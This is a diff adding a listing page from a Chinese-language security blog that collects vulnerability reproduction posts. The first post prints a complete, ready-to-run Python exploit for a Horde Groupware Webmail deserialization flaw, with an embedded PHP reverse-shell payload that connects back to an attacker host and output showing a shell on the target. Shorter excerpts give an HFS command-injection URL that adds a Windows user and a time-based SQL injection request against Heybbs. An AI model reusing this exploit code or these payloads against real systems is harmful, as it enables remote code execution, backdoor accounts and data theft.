@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/71/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Horde Groupware Webmail/Horde Groupware Webmail 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.322Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Horde-Groupware-Webmail-远程命令执行漏洞"><a href="#Horde-Groupware-Webmail-远程命令执行漏洞" class="headerlink" title="Horde Groupware Webmail 远程命令执行漏洞"></a>Horde Groupware Webmail 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Horde Groupware<br>Webmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde Groupware<br>Webmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>saturn:~ mr_me$ ./poc.py
+(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;
+(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+ 
+saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+(+) targeting http://172.16.175.145/horde/
+(+) obtained session iefankvohbl8og0mtaadm3efb6
+(+) inserted our php object
+(+) triggering deserialization...
+(+) starting handler on port 1337
+(+) connection from 172.16.175.145
+(+) pop thy shell!
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/var/www/horde/services
+uname -a
+Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
+exit
+*** Connection closed by remote host ***
+(+) repaired the target!
+</code></pre>
+<blockquote>
+<p>poc.py</p>
+</blockquote>
+<pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability
+
+Identifiers: ZDI-CAN-10436 / ZDI-20-1051
+Found by ..: mr_me
+Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33
+
+Summary:
+========
+
+It&#39;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py
+(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;
+(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+
+saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337
+(+) targeting http://172.16.175.145/horde/
+(+) obtained session iefankvohbl8og0mtaadm3efb6
+(+) inserted our php object
+(+) triggering deserialization...
+(+) starting handler on port 1337
+(+) connection from 172.16.175.145
+(+) pop thy shell!
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/var/www/horde/services
+uname -a
+Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
+exit
+*** Connection closed by remote host ***
+(+) repaired the target!
+&quot;&quot;&quot;
+
+
+import re
+import sys
+import socket
+import requests
+import telnetlib
+import base64
+from threading import Thread
+
+def rs(cbh, cbp):
+    return &quot;&quot;&quot;@error_reporting(-1);
+@set_time_limit(0); 
+@ignore_user_abort(1);
+$dis=@ini_get(&#39;disable_functions&#39;);
+if(!empty($dis))&#123;
+    $dis=preg_replace(&#39;/[, ]+/&#39;, &#39;,&#39;, $dis);
+    $dis=explode(&#39;,&#39;, $dis);
+    $dis=array_map(&#39;trim&#39;, $dis);
+&#125;else&#123;
+    $dis=array();
+&#125;
+$ipaddr=&#39;%s&#39;;
+$port=%d;
+function PtdSlhY($c)&#123;
+    global $dis; 
+    if (FALSE !== strpos(strtolower(PHP_OS), &#39;win&#39; )) &#123;
+        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;
+    &#125;
+    ob_start();
+    system($c);
+    $o=ob_get_contents();
+    ob_end_clean();
+    if (strlen($o) === 0)&#123;
+        $o = &quot;NULL&quot;;
+    &#125;
+    return $o;
+&#125;
+$nofuncs=&#39;no exec functions&#39;;
+$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);
+while($c=fread($s,2048))&#123;
+    $out = &#39;&#39;;
+    if(substr($c,0,3) == &#39;cd &#39;)&#123;
+        chdir(substr($c,3,-1));
+    &#125;else if (substr($c,0,4) == &#39;quit&#39; || substr($c,0,4) == &#39;exit&#39;) &#123;
+        break;
+    &#125;else&#123;
+        $out=PtdSlhY(substr($c,0,-1));
+        if($out===false)&#123;
+            fwrite($s, $nofuncs);
+            break;
+        &#125;
+    &#125;
+    fwrite($s,$out);
+&#125;
+fclose($s);&quot;&quot;&quot; % (cbh, cbp)
+
+def get_session(t, p, usr, pwd):
+    uri = &quot;http://%s%slogin.php&quot; % (t, p)
+    p = &#123;
+        &quot;login_post&quot; : 1337,
+        &quot;horde_user&quot; : usr,
+        &quot;horde_pass&quot; : pwd
+    &#125;
+    r = requests.post(uri, data=p, allow_redirects=False)
+    match = re.findall(&quot;Horde=(.&#123;26&#125;);&quot;, r.headers[&#39;set-cookie&#39;])
+    assert len(match) == 2, &quot;(-) failed to login&quot;
+    return match[1]
+
+def trigger_deserialization(t, p, s, host, port):
+    &quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;
+    handlerthr = Thread(target=handler, args=(port,))
+    handlerthr.start()
+    uri = &quot;http://%s%sservices/ajax.php/imp/imple&quot; % (t, p)
+    p = &#123;
+        &quot;imple&quot; : &quot;IMP_Prefs_Sort&quot;,
+        &quot;app&quot; : &quot;imp&quot;,
+    &#125;
+    h = &#123; &quot;cmd&quot; : base64.b64encode(rs(host, port).encode()) &#125;
+    c = &#123; &quot;Horde&quot; : s &#125;
+    r = requests.get(uri, params=p, cookies=c, headers=h)
+    match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text)
+    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;
+    p[&#39;token&#39;] = match.group(1)
+    r = requests.get(uri, params=p, cookies=c, headers=h)
+    assert r.status_code == 200, &quot;(-) failed to trigger deserialization!&quot;
+
+def get_pop():
+    &quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;
+    pop  = &#39;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#39;
+    pop += &#39;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#39;
+    pop += &#39;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#39;
+    pop += &#39;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#39;
+    pop += &#39;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#39;
+    pop += &#39;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#39;
+    pop += &#39;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#39;
+    pop += &#39;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#39;
+    pop += &#39;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#39;  # implements Serializable using custom unserialize/serialize
+    pop += &#39;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#39;
+    pop += &#39;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;             # additional checks
+    pop += &#39;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;
+    return pop
+
+def get_patch():
+    &quot;&quot;&quot; Our original array &quot;&quot;&quot;
+    patch  = &#39;a:1:&#123;&#39;
+    patch += &#39;s:5:&quot;INBOX&quot;;a:1:&#123;&#39;
+    patch += &#39;s:1:&quot;b&quot;;i:6;&#39;
+    patch += &#39;&#125;&#125;&#39;
+    return patch
+
+def set_pref(t, p, s, k, o):
+    &quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;
+    uri = &quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot; % (t, p)
+    p = &#123;
+        &quot;pref&quot; : k,
+        &quot;value&quot; : o,
+    &#125;
+    c = &#123; &quot;Horde&quot; : s &#125;
+    r = requests.get(uri, params=p, cookies=c)
+    match = re.search(&quot;horde_logout_token=(.*)&amp;&quot;, r.text)
+    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;
+    p[&#39;token&#39;] = match.group(1)
+    r = requests.get(uri, params=p, cookies=c)
+    assert (&quot;\&quot;response\&quot;:true&quot; in r.text and r.status_code == 200), &quot;(-) failed to set the preference!&quot;
+
+def handler(lport):
+    print(&quot;(+) starting handler on port %d&quot; % lport)
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((&quot;0.0.0.0&quot;, lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(&quot;(+) connection from %s&quot; % addr[0])
+    t.sock = conn
+    print(&quot;(+) pop thy shell!&quot;)
+    t.interact()
+
+def fix_path(p):
+    if p == &quot;/&quot;:
+        return p
+    if not p.startswith(&quot;/&quot;):
+        p = &quot;/%s&quot; % p
+    if not p.endswith(&quot;/&quot;):
+        p = &quot;%s/&quot; % p
+    return p
+
+def main():
+    if len(sys.argv) &lt; 5:
+        print(&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot; % sys.argv[0])
+        print(&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot; % sys.argv[0])
+        sys.exit(0)
+    target = sys.argv[1]
+    path   = fix_path(sys.argv[2])
+    user   = sys.argv[3].split(&quot;:&quot;)[0]
+    pswd   = sys.argv[3].split(&quot;:&quot;)[1]
+    host   = sys.argv[4].split(&quot;:&quot;)[0]
+    port   = int(sys.argv[4].split(&quot;:&quot;)[1])
+    print(&quot;(+) targeting http://%s%s&quot; % (target, path))
+    session = get_session(target, path, user, pswd)
+    print(&quot;(+) obtained session %s&quot; % session)
+    set_pref(target, path, session, &#39;sortpref&#39;, get_pop())
+    print(&quot;(+) inserted our php object&quot;)
+    print(&quot;(+) triggering deserialization...&quot;)
+    trigger_deserialization(target, path, session, host, port)
+    set_pref(target, path, session, &#39;sortpref&#39;, get_patch())
+    print(&quot;(+) repaired the target!&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqs1008ry8v12fpc7gdj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Hfs/Hfs 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.316Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Hfs-远程命令执行漏洞"><a href="#Hfs-远程命令执行漏洞" class="headerlink" title="Hfs 远程命令执行漏洞"></a>Hfs 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Rejetto HTTP File Server<br>2.3c及之前版本中的parserLib.pas文件中的’findMacroMarker’函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的’%00’序列利用该漏洞执行任意程序。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2.3c以前的2.3x版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org:8080/?search==%00&#123;.exec|cmd.exe /c [Command-String].&#125;
+http://www.0-sec.org:8080/?search==%00&#123;.exec|cmd.exe /c net user test1234 1234 /add.&#125;
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqn9008jy8v129q411v5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Heybbs/Heybbs 1.2 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Heybbs/Heybbs%201.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.311Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Heybbs-1-2-sql注入漏洞"><a href="#Heybbs-1-2-sql注入漏洞" class="headerlink" title="Heybbs 1.2 sql注入漏洞"></a>Heybbs 1.2 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Heybb 1.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>第一处注入存在于login.php文件的username参数处</strong></p>
+<pre><code>POST /php/login.php HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 98
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://www.0-sec.org
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.0-sec.org/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4
+Connection: close
+
+username=123123&#39; and (select 1 from (select(sleep(5)))accn) AND &#39;1&#39;=&#39;1&amp;password=123123&amp;verify=h4ir
+</code></pre>
+<blockquote>
+<p>将username标*放入sqlmap -r</p>
+</blockquote>
+<p><strong>第二处注入存在于user.php文件id参数处</strong></p>
+<p>Eg:</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Heybbs/Heybbs%201.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Heybbs/Heybbs%201.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqn8008iy8v129m82qif" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Hashbrown CMS/（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6949%EF%BC%89HashBrown%20CMS%20postUser%20%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.236Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-6949）HashBrown-CMS-postUser-函数存在提权漏洞"><a href="#（CVE-2020-6949）HashBrown-CMS-postUser-函数存在提权漏洞" class="headerlink" title="（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞"></a>（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS<br>1.3.3及之前版本中的’postUser’函数存在提权漏洞。攻击者可利用该漏洞修改管理员账户的哈希密码或重置该账户。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>HashBrown CMS 1.3.3及之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在读和部分此cms的源码后，希望对用户管理方面做个审计。这款CMS<br>的用户分为两种，一种是admin 权限用户，<br>可以创建和设置别的用户的属性，比如参管理那些项目，用户名密码设置等等。另外一种是editor<br>账户，其能管理哪些项目是由admin 设置的，editor<br>账户只能修改自己的用户名和密码。如下图这里的三个账户，admin 和 aaaa<br>是admin 用户，bbbb 是editor 账户</p>
+<p><img src="/resource/(CVE-2020-6949)HashBrownCMSpostUser%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>由于该CMS 不提供用户注册和找回密码的功能，<br>所以没有太多的地方可以去尝试突破，我就尝试聚焦有没有办法把editor<br>账户提权成admin 账户，那editor<br>账户只有一个地方可以修改自己的密码和其他属性。</p>
+<p><img src="/resource/(CVE-2020-6949)HashBrownCMSpostUser%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6949%EF%BC%89HashBrown%20CMS%20postUser%20%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6949%EF%BC%89HashBrown%20CMS%20postUser%20%E5%87%BD%E6%95%B0%E5%AD%98%E5%9C%A8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqno008oy8v1d2wwd2j8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Hashbrown CMS/（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6948%EF%BC%89HashBrown%20CMS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.234Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-6948）HashBrown-CMS-远程命令执行漏洞"><a href="#（CVE-2020-6948）HashBrown-CMS-远程命令执行漏洞" class="headerlink" title="（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞"></a>（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS<br>1.3.3及之前版本中存在远程代码执行漏洞，该漏洞源于程序没有进行正确的安全检查。攻击者可利用该漏洞执行代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>HashBrown CMS 1.3.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在之前收集的资料里面总结了发现漏洞基本有三个方法：</p>
+<ul>
+<li><p>通过关键字搜索，比如exec方法在很多语言里面代表执行系统命令，那你就可以搜索查看传入exec方法的参数有没有经过过滤，有没有办法利用。<a target="_blank" rel="noopener" href="https://github.com/wireghoul/graudit">https://github.com/wireghoul/graudit</a><br>  这个项目就罗列了很多语言的关键词可以用作参考。</p>
+</li>
+<li><p>  根据function来阅读代码，但是这种方法花费的时间比第一种多，有可能迷失在各种各种各样的方法中。</p>
+</li>
+<li><p>  通读代码，这样最全，但是显然速度要慢很多了。</p>
+</li>
+</ul>
+<p>对于Hashbrown<br>CMS，先用第一种方法开路。尝试了几个关键字之后我选取了exec这个关键字。在grep<br>之后发现了下面的结果。</p>
+<p><img src="/resource/(CVE-2020-6948)HashBrownCMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6948%EF%BC%89HashBrown%20CMS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Hashbrown%20CMS/%EF%BC%88CVE-2020-6948%EF%BC%89HashBrown%20CMS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qqnn008ny8v103dv19jr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Harbor/（CVE-2019-16097）Harbor未授权创建管理员漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Harbor/%EF%BC%88CVE-2019-16097%EF%BC%89Harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.228Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-16097）Harbor未授权创建管理员漏洞"><a href="#（CVE-2019-16097）Harbor未授权创建管理员漏洞" class="headerlink" title="（CVE-2019-16097）Harbor未授权创建管理员漏洞"></a>（CVE-2019-16097）Harbor未授权创建管理员漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
+<p>近日，镜像仓库Harbor爆出任意管理员注册漏洞，攻击者在请求中构造特定字符串，在未授权的情况下可以直接创建管理员账号，从而接管Harbor镜像仓库。我们得到消息，第一时间对该漏洞进了验证，官方已发布公告说明，最新的1.7.6和1.8.3已修复此漏洞，请使用到的用户尽快升级至安全版本。</p>
+<p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor<br>1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。</p>
+</blockquote>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Harbor 1.7.0版本至1.8.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://github.com/ianxtianxt/CVE-2019-1609
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Harbor/%EF%BC%88CVE-2019-16097%EF%BC%89Harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
